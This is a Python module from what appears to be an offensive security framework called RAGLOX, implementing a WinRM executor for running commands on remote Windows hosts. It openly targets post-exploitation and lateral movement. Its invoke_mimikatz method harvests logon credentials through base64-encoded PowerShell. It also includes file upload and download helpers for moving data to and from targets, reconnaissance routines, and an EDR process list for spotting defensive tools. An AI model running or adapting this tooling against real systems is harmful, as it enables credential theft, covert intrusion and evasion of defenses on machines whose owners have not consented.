# ═══════════════════════════════════════════════════════════════
# RAGLOX v3.0 - WinRM Executor
# Execute commands via WinRM on remote Windows systems
# ═══════════════════════════════════════════════════════════════

import asyncio
import logging
import base64
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

from .base import BaseExecutor
from .models import (
    ExecutorType,
    ExecutionRequest,
    ExecutionResult,
    ExecutionStatus,
    WinRMConfig,
    ShellType,
    Platform,
)

logger = logging.getLogger("raglox.executors.winrm")

# Try to import pywinrm (optional dependency)
try:
    import winrm
    from winrm.protocol import Protocol
    from winrm.exceptions import (
        WinRMError,
        WinRMTransportError,
        WinRMOperationTimeoutError,
    )
    WINRM_AVAILABLE = True
except ImportError:
    WINRM_AVAILABLE = False
    logger.warning("pywinrm not installed. WinRM executor will not be available.")


class WinRMExecutor(BaseExecutor):
    """
    WinRM Executor - Execute commands via WinRM on Windows.
    
    This executor connects to remote Windows systems via WinRM and
    executes commands. Useful for:
    - Remote reconnaissance on Windows targets
    - Post-exploitation on compromised Windows hosts
    - Lateral movement execution (Pass-the-Hash, etc.)
    - Remote tool execution (PowerShell, CMD)
    
    Supports:
    - NTLM authentication (default)
    - Kerberos authentication
    - Basic authentication (over HTTPS)
    - PowerShell and CMD execution
    - Certificate-based authentication
    - Connection over HTTP (5985) or HTTPS (5986)
    
    Requirements:
    - pywinrm library: pip install pywinrm
    - For Kerberos: pip install pywinrm[kerberos]
    
    Usage:
        config = WinRMConfig(
            host="192.168.1.100",
            username="Administrator",
            password=SecretStr("password"),
        )
        async with WinRMExecutor(config) as executor:
            result = await executor.execute(
                ExecutionRequest(command="whoami")
            )
            print(result.stdout)
    """
    
    executor_type = ExecutorType.WINRM
    supported_platforms = [Platform.WINDOWS]
    supported_shells = [ShellType.POWERSHELL, ShellType.CMD]
    
    def __init__(self, config: WinRMConfig):
        """
        Initialize WinRM executor.
        
        Args:
            config: WinRM connection configuration
            
        Raises:
            ImportError: If pywinrm is not installed
        """
        if not WINRM_AVAILABLE:
            raise ImportError(
                "pywinrm is required for WinRM executor. "
                "Install with: pip install pywinrm"
            )
        
        super().__init__(config)
        self.config: WinRMConfig = config
        self._session: Optional['winrm.Session'] = None
        self._protocol: Optional['Protocol'] = None
    
    # ═══════════════════════════════════════════════════════════
    # Connection Management
    # ═══════════════════════════════════════════════════════════
    
    async def _connect(self) -> None:
        """Establish WinRM connection."""
        # WinRM is stateless, but we validate connectivity here
        await asyncio.get_event_loop().run_in_executor(
            None, self._create_session
        )
    
    def _create_session(self) -> None:
        """Create WinRM session (sync, runs in executor)."""
        endpoint = self.config.endpoint
        
        # Build authentication parameters
        auth = (self.config.username, self.config.password.get_secret_value())
        
        # Transport-specific setup
        transport = self.config.transport.lower()
        
        self._session = winrm.Session(
            target=endpoint,
            auth=auth,
            transport=transport,
            server_cert_validation='ignore' if not self.config.ssl_verify else 'validate',
            read_timeout_sec=self.config.timeout,
            operation_timeout_sec=self.config.timeout,
        )
        
        # Test the connection with a simple command
        try:
            result = self._session.run_cmd('echo connected')
            if result.status_code != 0:
                raise ConnectionError("WinRM test command failed")
            self.logger.info(f"WinRM connection established to {self.config.host}")
        except WinRMTransportError as e:
            raise ConnectionError(f"WinRM transport error: {e}")
        except WinRMError as e:
            raise ConnectionError(f"WinRM error: {e}")
    
    async def _disconnect(self) -> None:
        """Close WinRM connection."""
        # WinRM sessions are stateless, no explicit disconnect needed
        self._session = None
        self.logger.debug(f"WinRM session closed for {self.config.host}")
    
    def _is_connected(self) -> bool:
        """Check if WinRM session exists."""
        return self._session is not None
    
    # ═══════════════════════════════════════════════════════════
    # Command Execution
    # ═══════════════════════════════════════════════════════════
    
    async def _execute_command(
        self,
        command: str,
        timeout: int = 300,
        working_directory: Optional[str] = None,
        environment: Optional[Dict[str, str]] = None,
        shell: Optional[ShellType] = None,
    ) -> Tuple[int, str, str]:
        """
        Execute a command via WinRM.
        
        Args:
            command: Command to execute
            timeout: Timeout in seconds
            working_directory: Remote working directory
            environment: Environment variables
            shell: Shell to use (PowerShell or CMD)
            
        Returns:
            Tuple of (exit_code, stdout, stderr)
        """
        if not self._is_connected():
            raise ConnectionError("WinRM not connected")
        
        shell = shell or self.config.shell
        
        # Build the full command
        full_command = self._build_windows_command(
            command=command,
            shell=shell,
            working_directory=working_directory,
            environment=environment,
        )
        
        self.logger.debug(f"WinRM executing ({shell.value}): {full_command[:100]}...")
        
        # Execute in thread pool (pywinrm is synchronous)
        try:
            result = await asyncio.wait_for(
                asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self._run_command_sync(full_command, shell, timeout)
                ),
                timeout=timeout + 5  # Add buffer for network latency
            )
            return result
            
        except asyncio.TimeoutError:
            raise TimeoutError(f"WinRM command timed out after {timeout}s")
        except WinRMOperationTimeoutError:
            raise TimeoutError(f"WinRM operation timed out")
        except WinRMTransportError as e:
            raise ConnectionError(f"WinRM transport error: {e}")
        except Exception as e:
            raise RuntimeError(f"WinRM execution failed: {e}")
    
    def _run_command_sync(
        self,
        command: str,
        shell: ShellType,
        timeout: int
    ) -> Tuple[int, str, str]:
        """
        Execute command synchronously (runs in thread pool).
        
        Args:
            command: Command to execute
            shell: Shell type
            timeout: Timeout in seconds
            
        Returns:
            Tuple of (exit_code, stdout, stderr)
        """
        if shell == ShellType.POWERSHELL:
            # Use PowerShell
            result = self._session.run_ps(command)
        else:
            # Use CMD
            result = self._session.run_cmd(command)
        
        # Decode output
        stdout = self._decode_output(result.std_out)
        stderr = self._decode_output(result.std_err)
        
        return result.status_code, stdout, stderr
    
    def _build_windows_command(
        self,
        command: str,
        shell: ShellType,
        working_directory: Optional[str] = None,
        environment: Optional[Dict[str, str]] = None,
    ) -> str:
        """
        Build the Windows command string.
        
        Args:
            command: Raw command
            shell: Shell type
            working_directory: Working directory
            environment: Environment variables
            
        Returns:
            Full command string for remote execution
        """
        parts = []
        
        if shell == ShellType.POWERSHELL:
            # Add environment variables for PowerShell
            if environment:
                for key, value in environment.items():
                    parts.append(f'$env:{key}="{value}"')
            
            # Add working directory change
            if working_directory:
                parts.append(f'Set-Location "{working_directory}"')
            
            # Add the main command
            parts.append(command)
            
            return "; ".join(parts)
        
        else:  # CMD
            # Add environment variables for CMD
            if environment:
                for key, value in environment.items():
                    parts.append(f'set {key}={value}')
            
            # Add working directory change
            if working_directory:
                parts.append(f'cd /d "{working_directory}"')
            
            # Add the main command
            parts.append(command)
            
            return " & ".join(parts)
    
    def _decode_output(self, output: bytes) -> str:
        """Decode WinRM output."""
        if not output:
            return ""
        
        # Try UTF-16 first (common for PowerShell), then UTF-8, then codepage
        for encoding in ['utf-16-le', 'utf-8', f'cp{self.config.codepage}', 'latin-1']:
            try:
                return output.decode(encoding).strip()
            except (UnicodeDecodeError, LookupError):
                continue
        
        return output.decode('utf-8', errors='replace').strip()
    
    # ═══════════════════════════════════════════════════════════
    # PowerShell-Specific Methods
    # ═══════════════════════════════════════════════════════════
    
    async def run_powershell_script(
        self,
        script: str,
        timeout: int = 300,
        encoded: bool = False,
    ) -> ExecutionResult:
        """
        Run a PowerShell script.
        
        Args:
            script: PowerShell script content
            timeout: Execution timeout
            encoded: Whether to use encoded command (-EncodedCommand)
            
        Returns:
            Execution result
        """
        if encoded:
            # Encode script for -EncodedCommand
            encoded_script = base64.b64encode(
                script.encode('utf-16-le')
            ).decode('ascii')
            command = f"powershell.exe -EncodedCommand {encoded_script}"
            
            # For encoded command, use CMD as wrapper
            return await self.execute(ExecutionRequest(
                command=command,
                shell=ShellType.CMD,
                timeout=timeout,
            ))
        else:
            return await self.execute(ExecutionRequest(
                command=script,
                shell=ShellType.POWERSHELL,
                timeout=timeout,
            ))
    
    async def invoke_mimikatz(
        self,
        mimikatz_command: str = "sekurlsa::logonpasswords",
        timeout: int = 120,
    ) -> ExecutionResult:
        """
        Execute Mimikatz commands (for credential harvesting).
        
        WARNING: This is for authorized penetration testing only!
        
        Args:
            mimikatz_command: Mimikatz command to execute
            timeout: Execution timeout
            
        Returns:
            Execution result
        """
        # Using Invoke-Mimikatz style (assumes it's already loaded)
        script = f"""
        try {{
            Invoke-Mimikatz -Command "{mimikatz_command}"
        }} catch {{
            Write-Error $_.Exception.Message
        }}
        """
        return await self.run_powershell_script(script, timeout=timeout, encoded=True)
    
    # ═══════════════════════════════════════════════════════════
    # File Operations
    # ═══════════════════════════════════════════════════════════
    
    async def file_exists(self, path: str) -> bool:
        """
        Check if a file exists on remote Windows host.
        
        Args:
            path: Remote path
            
        Returns:
            True if exists
        """
        result = await self.execute(ExecutionRequest(
            command=f'Test-Path "{path}"',
            shell=ShellType.POWERSHELL,
            timeout=30,
        ))
        return result.success and "True" in result.stdout
    
    async def read_file(self, path: str) -> Optional[str]:
        """
        Read a file from remote Windows host.
        
        Args:
            path: Remote file path
            
        Returns:
            File contents or None
        """
        result = await self.execute(ExecutionRequest(
            command=f'Get-Content "{path}" -Raw',
            shell=ShellType.POWERSHELL,
            timeout=60,
        ))
        return result.stdout if result.success else None
    
    async def write_file(self, path: str, content: str) -> bool:
        """
        Write content to a file on remote Windows host.
        
        Args:
            path: Remote file path
            content: Content to write
            
        Returns:
            True if successful
        """
        # Escape content for PowerShell
        escaped = content.replace("'", "''").replace("`", "``")
        result = await self.execute(ExecutionRequest(
            command=f"Set-Content -Path '{path}' -Value '{escaped}' -Encoding UTF8",
            shell=ShellType.POWERSHELL,
            timeout=60,
        ))
        return result.success
    
    async def upload_file_base64(
        self,
        local_path: str,
        remote_path: str,
    ) -> bool:
        """
        Upload a file using base64 encoding.
        
        Args:
            local_path: Local file path
            remote_path: Remote destination path
            
        Returns:
            True if successful
        """
        try:
            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode('ascii')
            
            # Write base64 content and decode on remote
            script = f"""
            $bytes = [Convert]::FromBase64String('{content}')
            [IO.File]::WriteAllBytes('{remote_path}', $bytes)
            """
            result = await self.run_powershell_script(script, timeout=120)
            return result.success
            
        except Exception as e:
            self.logger.error(f"Upload failed: {e}")
            return False
    
    async def download_file_base64(
        self,
        remote_path: str,
        local_path: str,
    ) -> bool:
        """
        Download a file using base64 encoding.
        
        Args:
            remote_path: Remote file path
            local_path: Local destination path
            
        Returns:
            True if successful
        """
        try:
            script = f"""
            $bytes = [IO.File]::ReadAllBytes('{remote_path}')
            [Convert]::ToBase64String($bytes)
            """
            result = await self.run_powershell_script(script, timeout=120)
            
            if result.success:
                content = base64.b64decode(result.stdout.strip())
                with open(local_path, 'wb') as f:
                    f.write(content)
                return True
            return False
            
        except Exception as e:
            self.logger.error(f"Download failed: {e}")
            return False
    
    # ═══════════════════════════════════════════════════════════
    # System Information
    # ═══════════════════════════════════════════════════════════
    
    async def get_system_info(self) -> Dict[str, str]:
        """
        Get remote Windows system information.
        
        Returns:
            Dictionary with system info
        """
        info = {}
        
        # Get computer name
        result = await self.execute(ExecutionRequest(
            command="$env:COMPUTERNAME",
            shell=ShellType.POWERSHELL,
            timeout=10,
        ))
        if result.success:
            info['hostname'] = result.stdout.strip()
        
        # Get OS version
        result = await self.execute(ExecutionRequest(
            command="[System.Environment]::OSVersion | Select-Object -ExpandProperty VersionString",
            shell=ShellType.POWERSHELL,
            timeout=10,
        ))
        if result.success:
            info['os_version'] = result.stdout.strip()
        
        # Get current user
        result = await self.execute(ExecutionRequest(
            command="whoami /all",
            shell=ShellType.CMD,
            timeout=15,
        ))
        if result.success:
            info['user_info'] = result.stdout.strip()[:1000]
        
        # Get domain info
        result = await self.execute(ExecutionRequest(
            command="$env:USERDOMAIN",
            shell=ShellType.POWERSHELL,
            timeout=10,
        ))
        if result.success:
            info['domain'] = result.stdout.strip()
        
        # Get architecture
        result = await self.execute(ExecutionRequest(
            command="$env:PROCESSOR_ARCHITECTURE",
            shell=ShellType.POWERSHELL,
            timeout=10,
        ))
        if result.success:
            info['architecture'] = result.stdout.strip()
        
        return info
    
    async def get_network_info(self) -> Dict[str, str]:
        """
        Get remote network information.
        
        Returns:
            Dictionary with network info
        """
        info = {}
        
        # Get IP configuration
        result = await self.execute(ExecutionRequest(
            command="ipconfig /all",
            shell=ShellType.CMD,
            timeout=15,
        ))
        if result.success:
            info['ip_config'] = result.stdout.strip()[:3000]
        
        # Get ARP table
        result = await self.execute(ExecutionRequest(
            command="arp -a",
            shell=ShellType.CMD,
            timeout=10,
        ))
        if result.success:
            info['arp_table'] = result.stdout.strip()[:1000]
        
        # Get active connections
        result = await self.execute(ExecutionRequest(
            command="netstat -ano",
            shell=ShellType.CMD,
            timeout=15,
        ))
        if result.success:
            info['connections'] = result.stdout.strip()[:3000]
        
        return info
    
    async def get_installed_software(self) -> List[Dict[str, str]]:
        """
        Get installed software list.
        
        Returns:
            List of software dictionaries
        """
        script = """
        Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |
        Select-Object DisplayName, DisplayVersion, Publisher |
        Where-Object { $_.DisplayName -ne $null } |
        ConvertTo-Json -Compress
        """
        result = await self.run_powershell_script(script, timeout=60)
        
        if result.success:
            try:
                import json
                return json.loads(result.stdout)
            except Exception:
                pass
        return []
    
    async def get_running_processes(self) -> List[Dict[str, Any]]:
        """
        Get running processes.
        
        Returns:
            List of process dictionaries
        """
        script = """
        Get-Process | Select-Object Id, ProcessName, Path, CPU |
        ConvertTo-Json -Compress
        """
        result = await self.run_powershell_script(script, timeout=30)
        
        if result.success:
            try:
                import json
                return json.loads(result.stdout)
            except Exception:
                pass
        return []
    
    async def check_av_status(self) -> Dict[str, Any]:
        """
        Check antivirus/EDR status.
        
        Returns:
            Dictionary with AV/EDR info
        """
        info = {}
        
        # Check Windows Defender status
        script = """
        Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled,
        IoavProtectionEnabled, AntispywareEnabled | ConvertTo-Json -Compress
        """
        result = await self.run_powershell_script(script, timeout=30)
        if result.success:
            try:
                import json
                info['defender'] = json.loads(result.stdout)
            except Exception:
                info['defender_raw'] = result.stdout[:500]
        
        # Check for common EDR processes
        edr_processes = [
            'CrowdStrike', 'falcon', 'cb', 'carbonblack',
            'sentinel', 'cylance', 'tanium', 'endgame'
        ]
        
        result = await self.execute(ExecutionRequest(
            command='Get-Process | Select-Object ProcessName',
            shell=ShellType.POWERSHELL,
            timeout=15,
        ))
        if result.success:
            processes = result.stdout.lower()
            info['detected_edr'] = [
                p for p in edr_processes if p.lower() in processes
            ]
        
        return info


# ═══════════════════════════════════════════════════════════════
# Stub for when pywinrm is not available
# ═══════════════════════════════════════════════════════════════

class WinRMExecutorStub(BaseExecutor):
    """Stub implementation when pywinrm is not available."""
    
    executor_type = ExecutorType.WINRM
    
    def __init__(self, config: WinRMConfig):
        raise ImportError(
            "pywinrm is required for WinRM executor. "
            "Install with: pip install pywinrm"
        )
    
    async def _connect(self) -> None:
        pass
    
    async def _disconnect(self) -> None:
        pass
    
    def _is_connected(self) -> bool:
        return False
    
    async def _execute_command(self, *args, **kwargs) -> Tuple[int, str, str]:
        return 1, "", "WinRM not available"


# Use the appropriate implementation
if not WINRM_AVAILABLE:
    WinRMExecutor = WinRMExecutorStub
